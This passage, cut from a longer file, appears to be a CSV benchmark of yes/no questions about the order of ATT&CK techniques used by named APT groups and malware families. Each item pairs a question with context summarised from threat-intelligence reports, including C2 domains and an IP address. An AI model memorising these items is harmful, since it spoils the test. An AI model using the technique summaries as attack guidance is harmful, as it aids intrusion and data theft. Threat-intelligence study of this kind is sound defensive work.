Privilege Escalation: The escalation of privileges is often needed to install malware or persistence points. Increased privileges are sometimes also required to be able to spread to other systems or gain access to the strategic goals (e.g. data).
Defense Evasion: Bypassing defense and detection mechanisms, e.g. by turning off the firewall at the endpoint or deleting log data, is one of the tactical goals that threat actors use in every other phase of their mission to either conceal their presence or bypass detection mechanisms.
Credential Access: Valid credentials play a key role for attackers. Firstly, it enables access to systems with legitimate credentials and lateral movement within the target network. Secondly, it grants access to the data that the attackers want. Furthermore, reusing credentials enables attackers to conduct an attack using few resources because no exploits have to be written, acquired or employed in any other way.
Discovery: Exploration within the target network is required to locate systems, users and data relevant to the mission.
Collection: The relevant data is collected.
Command and Control: The command & control channel is the attacker's means of communication to keep the compromised target infrastructure under his control. If the attacker loses this channel, the attack is literally stopped. As such attackers often establish multiple command & control channels to ensure access.
Exfiltration: This is the final phase required to successfully complete the mission and involves exfiltrating the relevant data.",Yes,security-report-2019
884,213,213-Lateral Movement-T1550-Use Alternate Authentication Material,"After using a multi-functional framework resistant to C&C server takeover for defense evasion, is it likely that Rocra attackers will use a module to scan the local network and employ admin credentials for lateral movement before leveraging their complex C&C infrastructure with over 60 domain names to control infected machines?","Lateral Movement: During lateral movement in a victim's network, the Rocra attackers deployed a module to actively scan the local area network, find hosts vulnerable to MS08-067, or accessible with admin credentials from their password database. Another module used collected information to infect remote hosts in the same network.","Initial Access: The 'Red October' campaign, identified as 'Rocra', has been active for at least five years, targeting diplomatic and governmental agencies worldwide. The attackers used spear phishing with documents containing exploits for known vulnerabilities such as CVE-2009-3129, CVE-2010-3333, and CVE-2012-0158 to gain initial access. The earliest attacks with the MS Excel exploit occurred in 2010 and 2011, while the MS Word exploits were used in the summer of 2012. The spear phishing documents were customized for the victims, with the executable replaced by the attackers' own code.
Defense Evasion: The Rocra attackers created a multi-functional framework capable of quick feature extension for intelligence gathering. The system is resistant to C&C server takeover and allows recovery access to infected machines using alternative communication channels. The attackers deployed a module during lateral movement to actively scan the local area network, find hosts vulnerable to MS08-067, or accessible with admin credentials from their password database.
Command and Control: The Rocra campaign's C&C infrastructure is a chain of servers working as proxies to hide the true command and control server. The attackers created more than 60 domain names and several server hosting locations in different countries, mainly Germany and Russia, to control the network of infected machines. The C&C infrastructure's complexity rivals that of the Flame malware.
Others: The Rocra campaign has been active for at least five years, infiltrating networks at diplomatic, governmental, and scientific research organizations. The attackers have Russian-speaking origins and have created a sophisticated multi-functional framework for intelligence gathering. The malware targets not only workstations but also mobile devices and network equipment. The attackers have used at least three different exploits for previously known vulnerabilities and have a high degree of interaction with the victims' networks. Kaspersky Lab has identified several hundred infections worldwide, with the majority in Eastern Europe, North America, and Western European countries. The campaign has infected hundreds of victims in eight main categories, including government, diplomatic, research institutions, and military. The attackers' malware modules have been created by Russian-speaking operatives and have not been used in any other operations. Kaspersky Lab, in collaboration with international organizations, is continuing its investigation and providing resources for remediation and mitigation.",Yes,Securelist_RedOctober
892,214,214-Lateral Movement-T1210-Exploitation of Remote Services,"After leveraging spear-phishing campaigns to harvest credentials during the Credential Access phase, is it likely that APT28 will use known vulnerabilities to exploit internet-facing servers before moving deeper into victim networks in the Lateral Movement phase?",Lateral Movement: APT28 has used strategic web compromises (SWC) to infect users with malware by redirecting them from compromised legitimate sites. They have also exploited known vulnerabilities on internet-facing servers to gain access and move deeper into victim networks.,"Initial Access: APT28 has engaged in spear-phishing campaigns to gain initial access to target networks. They have used spear-phishing emails containing malicious URLs designed to harvest email credentials or deliver exploit documents that deploy malware onto users' systems. For instance, APT28 registered domains spoofing legitimate organizations and webmail services to deceive victims into providing their credentials or accessing malicious documents. They exploited vulnerabilities such as Flash Vulnerability CVE-2016-7855 and Windows Vulnerability CVE-2016-7255 to install malware on victims who visited a malicious URL.
Execution: APT28 has been observed executing malware on victim systems through spear-phishing emails that deliver exploit documents. These documents exploit vulnerabilities to install malware such as GAMEFISH onto the targeted machines. APT28's malware suite includes tools like CHOPSTICK, EVILTOSS, GAMEFISH, SOURFACE, OLDBAIT, and CORESHELL, each serving roles such as backdoors, downloaders, and credential harvesters.
Defense Evasion: APT28 has demonstrated the ability to evade defenses by leveraging zero-day vulnerabilities, using public code depositories for development, and obtaining credentials through fabricated authorization requests. They have also shown a preference for using legitimate tools already present within victims' systems for lateral movement, sometimes foregoing their traditional toolset.
Credential Access: APT28 has used spear-phishing to harvest credentials, often by directing victims to fake login pages or by asking them to authorize malicious applications that bypass security measures like two-factor authentication. They have also employed credential harvesters like OLDBAIT within their malware suite.
Others: APT28, attributed to the Russian Government, has been active since at least 2007, targeting political entities, governments, militaries, and other organizations. They have been involved in information operations, including data leaks and false flag operations, to influence foreign politics. Notable incidents include the compromise of the World Anti-Doping Agency (WADA) and the Democratic National Committee (DNC), where stolen data was strategically leaked. APT28's operations align with Russian strategic interests and military doctrine, and they are expected to continue similar efforts in future political events.",Yes,APT28-Center-of-Storm-2017
897,217,217-Execution-T1204-User Execution,"After delivering KerrDown to targets via malicious Microsoft Office Documents with macros or RAR archives enabling DLL side-loading, is it likely that the Office document will contain an image file instructing the victim to enable macros before using base64 blobs to execute the malicious payload based on the victim's system architecture?","Execution: The malicious Office document contains an image file with a message in Vietnamese, asking the victim to enable macros to view the contents. The document has two different base64 blobs inserted in separate tables, with the font size changed to 1 to potentially evade detection. Depending on the victim's system architecture (32-bit or 64-bit), the appropriate base64 encoded blob is decoded and executed.","Initial Access: The OceanLotus group (APT32) has been using a new custom downloader malware named 'KerrDown' since early 2018. Two methods were identified for delivering KerrDown to targets: Microsoft Office Documents with malicious macros and RAR archives containing legitimate programs with DLL side-loading. The RAR file names used to trick targets are in Vietnamese, indicating that the primary targets are either in Vietnam or Vietnamese speaking individuals.
Defense Evasion: The actors reused a VBS decode function published by Motobit to decode base64 blobs. The KerrDown DLL is dropped in the directory 'Users\Administrator\AppData\Roaming\' as 'main_background.png'. The DLL retrieves the payload from a URL, decrypts it using the DES algorithm, and executes it in memory, ensuring that only the KerrDown DLL downloader is saved on the system and the payload is executed directly in memory without being written to the system.
Command and Control: The final payload of KerrDown, which was active during the time of analysis, turned out to be a variant of Cobalt Strike Beacon. This commercial penetration testing tool has been used by various threat actors in their campaigns. The KerrDown downloader attempts to download the payload from a URL depending on the OS architecture of the victim machine.
Others: Analysis of compile timestamps of KerrDown samples suggests that OceanLotus has been using the downloader since at least March 2018 and continues to actively use it. A pattern in the group's working hours was discerned, indicating a typical 9 AM to 6 PM working pattern in GMT+7, with most samples compiled during this period and on weekdays, suggesting formal working hours and operations likely out of Vietnam or nearby countries. The group's broader geographic and industry-wide target base may indicate the use of similar tools and playbooks against other targets. Palo Alto Networks customers are protected via Indicators of Compromise provided in the report.",Yes,OceanLotus_KerrDown
899,217,217-Defense Evasion-T1070-Indicator Removal,"After decoding and executing appropriate base64-encoded blobs based on the victim's system architecture during execution, is it likely that KerrDown will drop the DLL file 'main_background.png' before retrieving, decrypting, and executing the payload to evade defenses?","Defense Evasion: The actors reused a VBS decode function published by Motobit to decode base64 blobs. The KerrDown DLL is dropped in the directory 'Users\Administrator\AppData\Roaming\' as 'main_background.png'. The DLL retrieves the payload from a URL, decrypts it using the DES algorithm, and executes it in memory, ensuring that only the KerrDown DLL downloader is saved on the system and the payload is executed directly in memory without being written to the system.","Initial Access: The OceanLotus group (APT32) has been using a new custom downloader malware named 'KerrDown' since early 2018. Two methods were identified for delivering KerrDown to targets: Microsoft Office Documents with malicious macros and RAR archives containing legitimate programs with DLL side-loading. The RAR file names used to trick targets are in Vietnamese, indicating that the primary targets are either in Vietnam or Vietnamese speaking individuals.
Execution: The malicious Office document contains an image file with a message in Vietnamese, asking the victim to enable macros to view the contents. The document has two different base64 blobs inserted in separate tables, with the font size changed to 1 to potentially evade detection. Depending on the victim's system architecture (32-bit or 64-bit), the appropriate base64 encoded blob is decoded and executed.
Command and Control: The final payload of KerrDown, which was active during the time of analysis, turned out to be a variant of Cobalt Strike Beacon. This commercial penetration testing tool has been used by various threat actors in their campaigns. The KerrDown downloader attempts to download the payload from a URL depending on the OS architecture of the victim machine.
Others: Analysis of compile timestamps of KerrDown samples suggests that OceanLotus has been using the downloader since at least March 2018 and continues to actively use it. A pattern in the group's working hours was discerned, indicating a typical 9 AM to 6 PM working pattern in GMT+7, with most samples compiled during this period and on weekdays, suggesting formal working hours and operations likely out of Vietnam or nearby countries. The group's broader geographic and industry-wide target base may indicate the use of similar tools and playbooks against other targets. Palo Alto Networks customers are protected via Indicators of Compromise provided in the report.",Yes,OceanLotus_KerrDown
905,218,218-Defense Evasion-T1564-Hide Artifacts,"After using process hollowing to load executables into legitimate system processes during the execution stage, is Dexphot likely to utilize fileless techniques for defense evasion to prevent detection and obfuscate its activities?","Defense Evasion: Dexphot employed multiple layers of security evasion, including the use of SoftwareBundler:Win32/ICLoader to drop and run the installer, living-off-the-land techniques, and obfuscated batch scripts to check for antivirus products. It also used fileless techniques and process hollowing to hide malicious code within legitimate system processes, making detection and remediation difficult.","Execution: The Dexphot attack, first detected in October 2018, involved a complex execution stage where it wrote five key files to disk: an installer with two URLs, an MSI package file, a password-protected ZIP archive, a loader DLL, and an encrypted data file containing three additional executables. These executables were loaded into system processes via process hollowing, targeting legitimate system processes such as msiexec.exe, unzip.exe, rundll32.exe, schtasks.exe, and powershell.exe, and later svchost.exe, tracert.exe, and setup.exe.
Persistence: Dexphot ensured persistence through dual monitoring services that checked the status of all three malicious processes and re-infected the device if any were terminated. It also used schtasks.exe to create scheduled tasks for updates and re-infection, employing techniques like Scheduled Task and Signed Binary Proxy Execution. The tasks called msiexec.exe as a proxy to run the malicious code and updated Dexphot's components upon system reboot and every 90 or 110 minutes while the system was running.
Others: Microsoft Defender ATP Research Team, led by Hazel Kim, closely monitored the Dexphot threat for over a year, observing its evolution and the attackers' efforts to upgrade the malware, target new processes, and work around defensive measures. Microsoft Defender ATP's behavioral blocking and containment capabilities were crucial in stopping the Dexphot campaign. The team's insights into the goals and motivations of Dexphot's authors contributed to a broader understanding of cybercriminal behavior.",Yes,Insights from one year of tracking a polymorphic threat
912,219,219-Collection-T1113-Screen Capture,Is it likely that the FAKEM RAT will disguise its network traffic to look like standard protocol traffic using encryption for defense evasion before taking snapshots of the desktop as part of its collection activities?,"Collection: The RAT controller issues commands to the compromised computer, which include executing shell commands, browsing directories, accessing running processes, accessing the Windows registry, taking snapshots of the desktop, accessing services, and uploading files from the compromised computer.","Initial Access: All three versions of the FAKEM RAT were distributed via spear-phishing emails using social engineering to lure targets into executing a malicious attachment. The malicious attachments were often Microsoft Word documents with code that exploits vulnerabilities such as CVE-2010-3333, CVE-2012-0158, and CVE-2009-3129. Some samples were simply executable (.EXE) files.
Persistence: After exploitation, an .EXE file packed with UPX is dropped. The malware copies itself to the %System% folder and adds a registry entry to enable its automatic execution at every system startup.
Defense Evasion: The network traffic the malware produces is designed to look like Windows Messenger traffic. The FAKEM RAT disguises its network traffic to look like various protocols, including Windows Messenger and Yahoo! Messenger traffic, as well as HTML. The network communication is encrypted to ensure that the suspicious data passed between the compromised host and the attackers cannot be easily viewed in plain text.
Command and Control: The RAT controller communicates with the compromised computer using encrypted network communication. The encryption is done at the bit level, with each byte XOR-ed by every letter in the string, YHCRA, and rotated 3 bits to the right after every XOR operation.
Others: The FAKEM RAT infrastructure includes domains such as vcvcvcvc.dyndns.org, zjhao.dtdns.net, avira.suroot.com, *.googmail.com, and freeavg.sytes.net. These domains are used as command-and-control servers for the malware. The research paper by Trend Micro Incorporated highlights the importance of understanding the attack tools, techniques, and infrastructure of adversaries to develop defensive strategies.",Yes,wp-fakem-rat
935,221,221-Discovery-T1082-System Information Discovery,"After performing evasion techniques such as checking for virtual machines, sandboxes, and debugging environments, is it likely that the backdoor program will gather host information before utilizing DNS tunneling for communication with the C2 server and executing commands?",Discovery: The backdoor program gathered host information after executing evasion techniques.,"Initial Access: On January 9, 2019, the 360 Threat Intelligence Center detected multiple bait documents designed for Arabic speakers. These phishing documents were Office Excel files carrying malicious macros. The macros ultimately released and executed a backdoor program written in C# that used complex DNS tunneling techniques to communicate with the C2 server and execute commands. Additionally, the backdoor utilized the Google Drive API for file uploads and downloads.
Execution: The malicious macro code embedded in the bait document, an Office Excel file named "".xlsm"" (indexes.xlsm), was designed to release the WINDOWSTEMP.ps1 and 12-B-366.txt files into the %TEMP% directory. The latter file, which is actually an HTA (HTML Application) file, was used to launch the PowerShell script released earlier. The PowerShell script, WINDOWSTEMP.ps1, decoded and decompressed the content within the script using Base64 and gzip, wrote it to the file %TEMP%\OfficeUpdateService.exe, and then executed %TEMP%\OfficeUpdateService.exe.
Persistence: The backdoor program, after execution, would check for the presence of ""st:off"" and ""pd:off"" parameters. If ""st:off"" was included, it would not write startup items, and if ""pd:off"" was included, it would not release PDF files. It also performed checks for virtual machines, sandboxes, or debugging environments. If these checks were passed, it would execute malicious code and write startup items for persistence.
Defense Evasion: The backdoor program performed evasion techniques such as checking for virtual machines, sandboxes, and debugging environments to avoid detection.
Command and Control: The backdoor program established communication with the C2 server through DNS tunneling. The communication part was encapsulated in the queryTypesTest function. The command dispatch loop first determined if it was in x_mode; if not, it communicated with the C2 server via DNS tunneling to receive instructions. If in x_mode, it used HTTP for data transmission. The program parsed the data returned from the C2 server, extracted commands, and distributed them through the taskHandler function.
Others: The 360 Threat Intelligence Center, after detailed analysis, associated the attack with the DarkHydrus APT organization, which targets government agencies in the Middle East. The sample used DNS tunneling for communication, similar to malware previously disclosed by Palo Alto. The sandbox detection code and backdoor functionality code were highly consistent with previous findings. A Twitter user with the nickname Steve Williams was linked to the DarkHydrus username, and the nickname Williams was related to the PDB path of the C# written backdoor program. The attackers used Office VBA macros to execute malicious code due to the high cost of exploiting Office 0day vulnerabilities. The 360 Threat Intelligence Center's full product line, including the 360 Threat Intelligence Platform (TIP), SkyEye Advanced Threat Detection System, and 360 NGSOC, now supports precise detection of such attacks.",Yes,darkhydruns-group-against-middle-east-cn
944,222,222-Collection-T1074-Data Staged,"After gathering information about the victim's computer and environment through commands for registry key enumeration and listing running processes, is it likely that the Sednit group's malware will scan for files matching specific extensions before preparing the staged data for exfiltration by creating a file containing paths of all files to be exfiltrated?","Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.","Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.
Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.",Yes,A journey to Zebrocy land
951,222,222-Exfiltration-T1041-Exfiltration Over C2 Channel,"After Sednit’s malware gathered information about the victim's computer and environment, discovered files with specific extensions in local drives, and staged data with paths of identified files to exfiltrate, is it likely that the prepared file paths were hex-encoded and encrypted using a known or custom algorithm before being sent to the C&C server for exfiltration?",Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.,"Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.",Yes,A journey to Zebrocy land
965,226,226-Command and Control-T1573-Encrypted Channel,"After the Aria-body backdoor collects detailed information from the victim's machine, is it likely that the Naikon APT group will use HTTP and TCP protocols for C&C communication before executing additional commands received from the server?","Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.
Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
968,226,226-Discovery-T1087-Account Discovery,"After the Aria-body loader establishes persistence through methods such as utilizing the 'Startup' folder or the 'Run' registry key, is it likely that the Aria-body backdoor will attempt to gather information from the victim's machine, including usernames, as part of its system reconnaissance activities before performing tasks related to high-level collection like file searching or metadata gathering?","Discovery: The Aria-body backdoor gathered information from the victim's machine, including host-name, computer-name, username, domain name, windows version, processor speed, MachineGuid, system architecture, and public IP. It also collected data on installed software, active processes, running windows, TCP and UDP table status, and services data.","Initial Access: The Naikon APT group utilized various methods for initial access, including a weaponized RTF file named 'The Indians Way.doc' which exploited the RoyalRoad tool to drop a loader named 'intel.wll'. This loader would then attempt to download and execute the next stage payload from a command and control (C&C) server. Other methods included archive files containing a legitimate executable and a malicious DLL for DLL hijacking, and direct delivery via an executable file serving as a loader.
Execution: The Aria-body loader, specific to the Naikon APT group, was responsible for establishing persistence, injecting itself into processes, decrypting configuration data, contacting C&C servers, and loading the Aria-body backdoor. The loader's functionality varied slightly across versions, but its main tasks remained consistent since 2017.
Persistence: The Aria-body loader established persistence through the 'Startup' folder or the 'Run' registry key. Some variants also injected themselves into processes such as 'rundll32.exe' and 'dllhost.exe'.
Defense Evasion: To evade detection, the Naikon APT group operated their C&C servers within limited daily windows, going online for only a few hours each day. They also used fileless loading techniques and frequently changed server infrastructure and loader variants.
Collection: The Aria-body backdoor had capabilities to create/delete files and directories, take screenshots, search for files, launch files, enumerate process loaded modules, gather file metadata, close TCP sessions, collect OS information, and verify location using external services.
Command and Control: The Naikon APT group used HTTP and TCP protocols for C&C communication, sending collected data to the C&C domain along with an XORed password. The backdoor kept listening for additional commands from the server, which were executed upon receipt.
Others: The Naikon APT group targeted national government entities in the Asia Pacific region, including ministries of foreign affairs, science and technology ministries, and government-owned companies. They expanded their footholds by launching attacks from one compromised government entity to another. The group used servers within infected ministries as C&C servers to collect, relay, and route stolen data. The Aria-body backdoor included modules for USB data gathering, keylogging, reverse socks proxy, and loading extensions. The group's infrastructure primarily used GoDaddy for domain registration and Alibaba for hosting. Attribution to the Naikon APT group was made based on similarities in targeting, strings, hashing functions, code, and infrastructure overlap with previous operations.",Yes,Naikon APT_ Cyber Espionage Reloaded - Check Point Research
975,227,227-Discovery-T1497-Virtualization/Sandbox Evasion,"After executing malicious plugins such as 'grc.dll' for creating backup communication channels and 'usb.dll' for collecting USB drive information, is BlackEnergy2 likely to utilize the 'bs.dll' plugin for collecting detailed system information before employing the 'dstr.dll' plugin to overwrite hard drive data in acts of sabotage?","Discovery: The CTI report describes the 'bs.dll' plugin used by the BlackEnergy2 (BE2) group to gather detailed system information, including BIOS, motherboard, processor, and OS details. The plugin uses WMI client application, CPUID, and win32 API calls to collect this information. The data collected is used to identify the host system, potentially to evade sandbox environments, track down equipment sources, or aid in lateral movement within the victim environment.","Execution: The CTI report details the execution of malicious plugins by the BlackEnergy2 (BE2) group, targeting Windows systems. Notable plugins include 'dstr.dll' used for data destruction, 'grc.dll' for creating a backup communication channel via Google Plus, 'usb.dll' for collecting information on USB drives, and 'bs.dll' for gathering system information. The 'dstr.dll' plugin, in particular, is designed to overwrite data on hard drives, with both user-mode and kernel-mode functionality, including an embedded win32 library and win64 driver modules. The 'grc.dll' plugin interacts with Google Plus over HTTPS to retrieve encrypted BE configuration files. The 'usb.dll' plugin collects detailed information on connected USB drives and may implement BadUSB-related techniques. The 'bs.dll' plugin collects BIOS, motherboard, processor, and OS information using WMI client application, CPUID, and win32 API calls.
Impact: The CTI report discusses the 'dstr.dll' plugin, which is a Windows-only plugin used by the BE2 group to overwrite data on hard drives, potentially as an act of sabotage. The plugin supports both user-mode and kernel-mode wiper functionality and contains embedded win32 library and win64 driver modules. The plugin's goal is to destroy data stored on hard drives by overwriting file contents, which could disrupt availability or compromise integrity by manipulating business and operational processes.
Others: The CTI report mentions the BE2 group's exploitation of Siemens Simatic WinCC systems, where the attackers attempted to force the 'ccprojectmgr.exe' process to download and execute a specific BlackEnergy2 payload. The report also notes the use of spearphishing with Word documents in Ukraine and the presence of APT attacks employing various techniques, including the use of .NET and Powershell malware. Additionally, the report references various security bulletins and predictions for the evolution of cyber threats in the corporate sector.",Yes,be2-extraordinary-plugins-siemens-targeting-dev-fails
985,228,228-Discovery-T1518-Software Discovery,"After obtaining passwords from Firefox browser profiles using the Password module of XAgent, is it likely that the RemoteShell module will list installed applications on the infected system before the FileSystem module is used for file management operations such as creating and executing files?","Discovery: The InfoOS module within XAgent gathers information from the infected computer, such as IOPlatformUUID, process list, and operating system version. The RemoteShell module lists installed applications and iPhone backups.","Initial Access: The CTI report details an attack flow initiated by the APT28/Sofacy group using a Mac OS X Trojan named 'Komplex'. The attack begins with the Komplex Binder, which is an executable named 'roskosmos_2015-2025.app'. Its primary function is to save a second payload, the dropper, on the system and open a decoy PDF file. The Komplex Dropper's main role is to drop the final payload, ensuring persistence on the infected system by creating directories and modifying file permissions. The final payload, the Komplex Payload, is responsible for downloading and executing files as directed by the C&C servers. The report suggests that the XAgent malware is likely distributed via the Komplex malware.
Execution: The CTI report describes the initialization of the XAgent component's main module, BootXLoader, which checks for debugger presence and waits for internet connectivity before initializing communication with C&C servers. The MainHandler module starts and manages C&C commands and spying modules.
Persistence: The report indicates that the Komplex Dropper ensures persistence on the infected system by creating directories and modifying file permissions. Additionally, the Launcher module within XAgent is responsible for generating the malware's file path on the infected system and re-executing itself. The malware is located in a random directory within the '<UserHomedir>/Library/Assistants/.local/' path, with both the directory and filename picked from hardcoded lists.
Defense Evasion: The CTI report mentions that the XAgent component checks for the presence of a debugger during its initialization process and exits if one is found, as a means of defense evasion. Additionally, the Komplex Binder opens a decoy PDF file to distract the user while the actual payload is being executed.
Credential Access: The Password module within XAgent is used to obtain passwords from Firefox browser profiles, which are then saved to a file to be sent to the C&C servers.
Collection: The FileSystem module within XAgent is used for file management, including finding, deleting, executing, and creating files. The CameraShot module, although not implemented, suggests an intention to capture images, potentially for data collection purposes.
Command and Control: The CTI report details the communication process between the XAgent malware and the C&C servers. It starts by selecting a C&C server from a hardcoded list, sends a hello message, and then starts two main communication threads: one for receiving commands and one for sending data. The HTTPChannel module is used for continuous communication with the C&C server, receiving commands, and sending stolen data.
Exfiltration: The CTI report describes the use of the msgPacket structure for exfiltrating information to the C&C server, such as screenshots, passwords, files, and more. The data is encrypted with RC4 and sent in a POST request to the C&C server.
Others: The CTI report provides an overview of the APT28 group's targeting of Mac OS X users with the XAgent malware, highlighting the need for organizations to address computer security across all operating systems. Bitdefender, the CTI vendor, emphasizes the importance of unified security measures to prevent determined attackers from exploiting devices and networks.",Yes,Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web
1008,23,23-Defense Evasion-T1574-Hijack Execution Flow,"After the malware persistence was established by creating a Run key in the registry, is it likely that the malware will use a hijacking DLL for defense evasion before executing a fake document as a decoy to victims using the RichEdit function?","Defense Evasion: The malware used a hijacking DLL to prepare and protect shellcode in memory using localAlloc and VirtualProtect, respectively.","Initial Access: The initial PE extracted a fake document and a second PE which created a Run key for persistence. The persistence mechanism involved editing the status of a key in the registry to ensure the dropper's persistence.
Execution: The malware executed a fake document as a decoy to victims using the RichEdit function. It then waited for commands from the attacker.
Persistence: The initial PE created a Run key in the registry for persistence, ensuring the dropper maintained its presence on the system.
Command and Control: The malware utilized a legitimate ESET Remote Administrator tool for malicious purposes. It verified the validation of a certificate and used a cryptographic function to encrypt different parts of the tool. The malware also loaded XML configuration for global parameters, managing the service of the RAT and its status.
Others: The malware analysis revealed an unknown Chinese APT campaign using a well-known RAT, PlugX, which has been used since 2012 by Chinese APT groups. The domain used for C2 was based in Canada and hosted by the cloud provider GoDaddy, with registration information indicating Chinese provenance. The campaign was linked to Chinese APT groups following the U.S. National Security Advisor's visit to Mongolia. The documents used were compilations of multiple documents about national security concepts available on the web. Other samples targeted the Jaish group, which had recently infiltrated Kashmir. Pakistan and China cooperated against the Jaish Association, leading to cyberattacks and military deployments observed by d-atis between Pakistan, India, and China over the past two months. Indicators of Compromise (IOCs) were provided, including file hashes, an IP address (167.88.180.148), and a domain (www.apple-net.com) associated with the C2 infrastructure.",Yes,CyberThreatIntel_Malware analysis 20-08-19.md at master · StrangerealIntel_CyberThreatIntel
1018,230,230-Defense Evasion-T1221-Template Injection,"After ensuring persistence by inserting malicious macros into existing documents that execute when reopened, is Gamaredon likely to leverage template injection to add remote templates to documents for defense evasion before utilizing their backdoors to list interesting files found on a system for future exfiltration?","Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.
